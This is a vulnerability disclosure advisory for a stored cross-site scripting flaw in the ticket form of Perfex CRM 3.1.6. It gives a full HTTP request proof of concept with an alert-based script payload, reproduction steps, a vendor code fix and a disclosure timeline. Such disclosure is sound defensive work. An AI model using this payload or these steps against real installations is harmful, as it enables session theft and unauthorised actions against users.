# Security Advisory: Stored Cross-Site Scripting (XSS) Vulnerability in Perfex CRM

- Advisory Date: 13 Sep, 2024
- CVE ID: [Pending CVE assignment through VulDB]
- Affected Product: Perfex CRM
- Affected Version: 3.1.6
- Discovered By: Jobyer Ahmed - Bytium

## Description
A stored Cross-Site Scripting (XSS) vulnerability was identified in Perfex CRM, specifically in the open ticket functionality. This vulnerability allows an attacker to inject malicious JavaScript into the ticket submission form, stored on the server and executed when users, including administrators, view the submitted ticket.

The vulnerability has been reported to the developer and CodeCanyon, which hosts the software. The developer has acknowledged the issue and provided a temporary fix, with an official patch pending release. CodeCanyon has also confirmed they are following up with the developer as part of their internal process to ensure the issue is resolved.

## Vulnerable Parameter:
- Parameter: message
- Endpoint: /clients/open_ticket

## Proof of Concept (PoC):
The following HTTP request demonstrates how a malicious actor could exploit this vulnerability by injecting a payload into the message field:

```http
POST /perfex/clients/open_ticket HTTP/1.1
Host: 192.168.1.16
Content-Length: 958
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.16
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYOUSBSv8TScP0MN8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.16/perfex/clients/open_ticket
Accept-Encoding: gzip, deflate, br
Cookie: csrf_cookie_name=5edada6dd436d0f723d69b2f2d22d692; contact_language=english; sp_session=mth17comeclv6jp5ijtgf1gnnbvb91gc
Connection: keep-alive

------WebKitFormBoundaryYOUSBSv8TScP0MN8
Content-Disposition: form-data; name="csrf_token_name"

5edada6dd436d0f723d69b2f2d22d692
------WebKitFormBoundaryYOUSBSv8TScP0MN8
Content-Disposition: form-data; name="subject"

XSS Proof
------WebKitFormBoundaryYOUSBSv8TScP0MN8
Content-Disposition: form-data; name="project_id"


------WebKitFormBoundaryYOUSBSv8TScP0MN8
Content-Disposition: form-data; name="department"

1
------WebKitFormBoundaryYOUSBSv8TScP0MN8
Content-Disposition: form-data; name="priority"

2
------WebKitFormBoundaryYOUSBSv8TScP0MN8
Content-Disposition: form-data; name="service"

1
------WebKitFormBoundaryYOUSBSv8TScP0MN8
Content-Disposition: form-data; name="message"

XSS Proof <body onload=alert("Vulnerable")>
------WebKitFormBoundaryYOUSBSv8TScP0MN8
Content-Disposition: form-data; name="attachments[0]"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryYOUSBSv8TScP0MN8--
```

In this example, a malicious payload is injected into the message field, which, when viewed by an admin or any user, triggers the JavaScript alert.

## Steps to Reproduce:
1. Navigate to the open ticket form on the Perfex CRM client portal.
2. Submit the form, injecting the following payload into the message parameter:

`<body onload=alert("Vulnerable")>`

3. The payload is successfully stored in the system.
4. When an admin or any user views the ticket, the malicious script is executed in the victim's browser.

## Impact:
An attacker exploiting this vulnerability could:

Steal session cookies and impersonate users.
Execute arbitrary JavaScript in the context of the victimâ€™s session.
Perform unauthorized actions on behalf of users.
Redirect users to malicious websites.

This can lead to significant security risks, especially for administrative users who may have access to sensitive data.

## Affected Versions:
Perfex CRM version 3.1.6 (and possibly earlier versions).

## Vendor Response:
The vendor has confirmed the vulnerability and provided the following instructions to fix it in your current installation:

```php
// In application/controllers/Clients.php, replace the following line:
'message' => $data['message'],

// With:
'message' => $this->input->post('message', false),

// This change should be made in two places within the file.
```

## Mitigation:
1. Apply the vendor-provided fix by editing the `application/controllers/Clients.php` file.
2. Until the official patch is released, users should also:
    - Sanitize User Inputs: Ensure that all input fields, especially the message parameter, are properly sanitized by escaping special characters.
    - Implement Strict Input Validation: Perform strict server-side validation to prevent malicious input.


## Timeline:
- Vulnerability Discovered: 5 Sep, 2024
- Vendor Notified: 8 Sep, 2024
- Vendor Response: 9 Sep, 2024
- CodeCanyon Response: 13 Sep, 2024
- Current Status: No patch released.

## Conclusion:
This stored XSS vulnerability in Perfex CRM could lead to significant security risks. The developer has provided a temporary fix, and CodeCanyon is actively following up to ensure the issue is resolved. Users should apply the provided fix immediately and monitor for the official patch release.  
